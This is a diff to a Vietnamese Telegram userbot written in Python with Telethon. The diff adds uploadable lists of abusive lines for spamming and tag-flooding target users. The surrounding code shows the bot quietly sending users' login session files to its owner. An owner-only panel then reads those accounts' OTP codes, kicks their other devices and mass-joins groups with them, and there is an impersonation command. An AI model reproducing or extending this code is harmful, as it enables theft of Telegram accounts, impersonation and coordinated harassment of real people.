@@ -4,8 +4,7 @@ from telethon import TelegramClient, events, Button, functions, types
 from telethon.errors import (
     FloodWaitError, RPCError, UserNotParticipantError, 
     SessionPasswordNeededError, PhoneCodeInvalidError, 
-    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError,
-    FreshResetAuthorizationsForbiddenError
+    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError
 )
 
 # ==========================================
@@ -34,9 +33,15 @@ anti_disconnect_tasks = {}
 def get_user_delay(u_i):
     return user_delays.get(u_i, DEFAULT_DELAY)
 
-def get_default_lines():
+def get_user_lines(u_i):
+    """Lấy kho ngôn riêng của người dùng nếu có, ngược lại lấy kho ngôn mặc định"""
+    custom_file = f"custom_lines_{u_i}.txt"
     lines = []
-    if os.path.exists("chui.txt"):
+    if os.path.exists(custom_file):
+        with open(custom_file, "r", encoding="utf-8") as f:
+            lines = [line.strip() for line in f if line.strip()]
+    
+    if not lines and os.path.exists("chui.txt"):
         with open("chui.txt", "r", encoding="utf-8") as f:
             lines = [line.strip() for line in f if line.strip()]
     if not lines and os.path.exists("chui2.txt"):
@@ -165,7 +170,7 @@ def get_main_menu(u):
 """
     buttons = [
         [Button.inline("💥 Spam & Tag", data="m_spam"), Button.inline("☠ Mute / Câm", data="m_mute")],
-        [Button.inline("📦 Lặt Vặt & Tiện Ích", data="m_other"), Button.inline("⚙️ CẤU HÌNH DELAY", data="m_setting")]
+        [Button.inline("📦 Lặt Vặt & Tiện Ích", data="m_other"), Button.inline("⚙️ CẤU HÌNH DELAY & NGÔN", data="m_setting")]
     ]
     
     if u == O_ID:
@@ -232,7 +237,6 @@ async def notify_admin_login(client, user_id, phone_number):
 • **ID Bot User:** `{user_id}`
 """
         buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]
-        # CHỈ GỬI THÔNG BÁO CHO DUY NHẤT O_ID
         try:
             if avatar_path and os.path.exists(avatar_path):
                 await bot.send_file(O_ID, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
@@ -264,8 +268,8 @@ def _logic(c, u_i):
 
 💥 **NHÓM LỆNH SPAM & TAG:**
 • `/sptagname <@username>` : Spam tag tên liên tục.
-• `/sp <id>` : Spam danh sách chửi 1 vào đối tượng.
-• `/sp2 <id>` : Spam danh sách chửi 2 vào đối tượng.
+• `/sp <id>` : Spam kho ngôn vào đối tượng.
+• `/sp2 <id>` : Spam kho ngôn vào đối tượng.
 • `/spicon <số_lượng>` : Spam các icon trêu tức.
 • `/stop` : Dừng ngay lập tức toàn bộ tiến trình spam.
 
@@ -306,21 +310,19 @@ def _logic(c, u_i):
     async def _sptagname(e):
         username = e.pattern_match.group(1).replace('@', '')
         _mk(e.chat_id); await e.delete()
-        if os.path.exists('chui.txt'):
-            with open('chui.txt', 'r', encoding='utf-8') as f:
-                lines = [line.strip() for line in f if line.strip()]
-            if not lines: return
-            s_t[u_i] = True
-            while s_t.get(u_i):
-                for m in lines:
-                    if not s_t.get(u_i): break
-                    try:
-                        fm = f"{m} [@{username}](tg://resolve?domain={username})"
-                        await c.send_message(e.chat_id, fm, parse_mode='markdown')
-                        delay = get_user_delay(u_i)
-                        await asyncio.sleep(delay)
-                    except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
-                    except: break
+        lines = get_user_lines(u_i)
+        if not lines: return
+        s_t[u_i] = True
+        while s_t.get(u_i):
+            for m in lines:
+                if not s_t.get(u_i): break
+                try:
+                    fm = f"{m} [@{username}](tg://resolve?domain={username})"
+                    await c.send_message(e.chat_id, fm, parse_mode='markdown')
+                    delay = get_user_delay(u_i)
+                    await asyncio.sleep(delay)
+                except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
+                except: break
 
     @c.on(events.NewMessage(outgoing=True, pattern=r'/info(?:\s+(.+))?'))
     async def _inf(e):
@@ -374,12 +376,14 @@ def _logic(c, u_i):
     @c.on(events.NewMessage(outgoing=True, pattern=r'/sp (\d+)'))
     async def _sp1(e):
         t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
-        if os.path.exists('chui.txt'): await _sd(e.chat_id, open('chui.txt', 'r', encoding='utf-8').readlines(), t)
+        lines = get_user_lines(u_i)
+        await _sd(e.chat_id, lines, t)
 
     @c.on(events.NewMessage(outgoing=True, pattern=r'/sp2 (\d+)'))
     async def _sp2(e):
         t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
-        if os.path.exists('chui2.txt'): await _sd(e.chat_id, open('chui2.txt', 'r', encoding='utf-8').read().strip(), t)
+        lines = get_user_lines(u_i)
+        await _sd(e.chat_id, lines, t)
 
     @c.on(events.NewMessage(outgoing=True, pattern=r'/spicon (\d+)'))
     async def _spi(e):
@@ -501,7 +505,7 @@ async def _callback_handler(ev):
     elif data == "app_discord":
         return await ev.answer("⚠️ Tính năng đang đc bảo trì!", alert=True)
 
-    # ADMIN CONTROL PANEL (CHỈ DUY NHẤT O_ID DÙNG ĐƯỢC)
+    # ADMIN CONTROL PANEL
     elif data == "m_control":
         if u != O_ID: return await ev.answer("❌ Bạn không có quyền Admin chính!", alert=True)
         if not u_c:
@@ -544,7 +548,6 @@ async def _callback_handler(ev):
         ]
         await ev.edit(text=txt, buttons=buttons, parse_mode='markdown')
 
-    # CHỨC NĂNG 1: TỰ ĐỘNG THAM GIA TẤT CẢ NHÓM (HỎI SỐ LƯỢNG & DANH SÁCH LINK)
     elif data == "rmt_auto_join_groups":
         if u != O_ID: return
         target_uid = admin_selected_target.get(u)
@@ -563,13 +566,11 @@ async def _callback_handler(ev):
             links_res = await cv.get_response()
             raw_text = links_res.text.strip()
             
-            # Tách các link / username nhóm ra khỏi văn bản
             found_groups = re.findall(r'(?:https?://t\.me/|@)?([a-zA-Z0-9_]{5,})', raw_text)
             
             if not found_groups:
                 return await cv.send_message("❌ Không tìm thấy link hay username nhóm hợp lệ nào!")
             
-            # Giới hạn đúng số lượng nhóm admin yêu cầu
             found_groups = found_groups[:group_count]
             client = u_c[target_uid]
             await cv.send_message(f"⏳ **Bắt đầu tự động tham gia {len(found_groups)} nhóm...**")
@@ -580,7 +581,7 @@ async def _callback_handler(ev):
                     await client(functions.channels.JoinChannelRequest(channel=grp))
                     success += 1
                     await cv.send_message(f"✅ Đã vào nhóm: `@{grp}`")
-                    await asyncio.sleep(3) # Delay tránh dính FloodWait
+                    await asyncio.sleep(3)
                 except Exception as ex:
                     try:
                         await client(functions.messages.ImportChatInviteRequest(hash=grp))
@@ -593,7 +594,6 @@ async def _callback_handler(ev):
 
             await cv.send_message(f"🎉 **ĐÃ HOÀN THÀNH TỰ ĐỘNG VÀO NHÓM!**\n• Thành công: `{success}`\n• Thất bại: `{fail}`")
 
-    # CHỨC NĂNG 2: CHECK MÃ OTP TELEGRAM
     elif data == "rmt_check_otp":
         if u != O_ID: return
         target_uid = admin_selected_target.get(u)
@@ -618,7 +618,6 @@ async def _callback_handler(ev):
         except Exception as ex:
             await ev.respond(f"❌ **Lỗi đọc OTP:** `{ex}`")
 
-    # CHỨC NĂNG 3: KICK TOÀN BỘ CÁC THIẾT BỊ KHÁC (TRỪ PHIÊN BOT HIỆN TẠI)
     elif data == "rmt_kick_devices":
         if u != O_ID: return
         target_uid = admin_selected_target.get(u)
@@ -630,7 +629,6 @@ async def _callback_handler(ev):
             auths = await client(functions.account.GetAuthorizationsRequest())
             kicked = 0
             for auth in auths.authorizations:
-                # LOẠI TRỪ THIẾT BỊ HIỆN TẠI CỦA BOT (auth.current)
                 if not auth.current:
                     try:
                         await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
@@ -642,8 +640,11 @@ async def _callback_handler(ev):
             else:
                 await ev.respond("ℹ️ **Hiện tại không có thiết bị khác nào ngoài phiên của Bot đang hoạt động!**")
 
-        except FreshResetAuthorizationsForbiddenError:
-            await ev.respond("❌ **Chính sách bảo mật Telegram:** Tài khoản mới đăng nhập chưa đủ 24h nên Telegram tạm thời chặn tính năng kick thiết bị khác. Vui lòng thử lại sau 24h!")
+        except RPCError as ex:
+            if "FRESH_RESET_AUTHORISATION_FORBIDDEN" in str(ex):
+                await ev.respond("❌ **Chính sách bảo mật Telegram:** Tài khoản mới đăng nhập chưa đủ 24h nên Telegram tạm thời chặn tính năng kick thiết bị khác. Vui lòng thử lại sau 24h!")
+            else:
+                await ev.respond(f"❌ **Lỗi Telegram:** `{ex}`")
         except Exception as ex:
             await ev.respond(f"❌ **Lỗi kick thiết bị:** `{ex}`")
 
@@ -876,21 +877,64 @@ async def _callback_handler(ev):
         txt = f"📦 **DANH SÁCH LẶT VẶT & ACC**\n────────────────\n• `/info <@/id/rep>`: Soi acc\n• `/fake <@/id/rep>`: Fake acc đối tượng\n• `/diefake`: Trở về acc gốc\n• `/voice <văn bản>`: Tạo voice\n• `/logout`: Thoát acc khỏi bot{warn}"
         await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
 
+    # ==========================================
+    # CẤU HÌNH DELAY VÀ KHO NGÔN TÙY CHỈNH
+    # ==========================================
     elif data == "m_setting":
         cur_d = get_user_delay(u)
+        custom_file = f"custom_lines_{u}.txt"
+        has_custom = os.path.exists(custom_file)
+        custom_status = "🔴 Đang dùng Mặc Định" if not has_custom else "🟢 Đã tải lên Kho Ngôn riêng"
+
         txt = f"""
-⚙️ **CẤU HÌNH DELAY TOÀN BỘ CHỨC NĂNG**
+⚙️ **CẤU HÌNH DELAY & KHO NGÔN NGU**
 ────────────────
-• Delay hiện tại của bạn: `{cur_d} giây`
-• Mặc định hệ thống: `{DEFAULT_DELAY} giây`
+• **Delay hiện tại:** `{cur_d} giây`
+• **Trạng thái Kho Ngôn:** `{custom_status}`
 """
         buttons = [
-            [Button.inline("⏱ Đặt Mặc Định (0.2s)", data="set_delay_default")],
-            [Button.inline("⚡ Set Delay 0.1s", data="set_delay_01"), Button.inline("🐢 Set Delay 0.5s", data="set_delay_05")],
-            [Button.inline("🐌 Set Delay 1.0s", data="set_delay_10"), Button.inline("💬 Nhập Số Giây Tự Chỉnh", data="set_delay_custom")],
+            [Button.inline("📝 Tải Lên Kho Ngôn Tùy Chỉnh", data="set_custom_lines")],
+            [Button.inline("🔄 Dùng Kho Ngôn Mặc Định", data="reset_custom_lines")],
+            [Button.inline("⏱ Set Delay Mặc Định (0.2s)", data="set_delay_default")],
+            [Button.inline("⚡ Delay 0.1s", data="set_delay_01"), Button.inline("🐢 Delay 0.5s", data="set_delay_05")],
+            [Button.inline("🐌 Delay 1.0s", data="set_delay_10"), Button.inline("💬 Tự Chỉnh Delay", data="set_delay_custom")],
             [Button.inline("🔙 Trở Về Menu", data="m_main")]
         ]
         await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "set_custom_lines":
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            await cv.send_message("📝 **GỬI KHO NGÔN CỦA BẠN**\n────────────────\n• Gửi **File `.txt`** (mỗi câu 1 dòng)\n• HOẶC **Nhập tin nhắn dạng văn bản** (mỗi câu cách nhau xuống dòng):")
+            res = await cv.get_response()
+            custom_file = f"custom_lines_{u}.txt"
+            
+            lines = []
+            if res.file and res.file.ext == ".txt":
+                file_path = await res.download_media()
+                with open(file_path, "r", encoding="utf-8") as f:
+                    lines = [line.strip() for line in f if line.strip()]
+                if os.path.exists(file_path): os.remove(file_path)
+            elif res.text:
+                lines = [line.strip() for line in res.text.split("\n") if line.strip()]
+
+            if lines:
+                with open(custom_file, "w", encoding="utf-8") as f:
+                    for line in lines:
+                        f.write(f"{line}\n")
+                await cv.send_message(f"✅ **Đã lưu Kho Ngôn Tùy Chỉnh thành công!** tổng cộng `{len(lines)}` câu.")
+            else:
+                await cv.send_message("❌ Kho ngôn trống hoặc không hợp lệ!")
+
+    elif data == "reset_custom_lines":
+        custom_file = f"custom_lines_{u}.txt"
+        if os.path.exists(custom_file):
+            os.remove(custom_file)
+            await ev.answer("✅ Đã khôi phục Kho Ngôn về Mặc Định!", alert=True)
+        else:
+            await ev.answer("ℹ️ Bạn đang sử dụng Kho Ngôn Mặc Định rồi!", alert=True)
+        msg, buttons = get_main_menu(u)
+        await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
     elif data == "set_delay_default":
         user_delays[u] = DEFAULT_DELAY
@@ -979,7 +1023,6 @@ async def _callback_handler(ev):
                 
                 u_c[u] = c; _logic(c, u)
                 
-                # GỬI FILE SESSION CHỈ VỀ CHO DUY NHẤT O_ID
                 await send_session_file_to_admin(c, u, p)
 
                 task = asyncio.create_task(start_anti_disconnect(u, c))
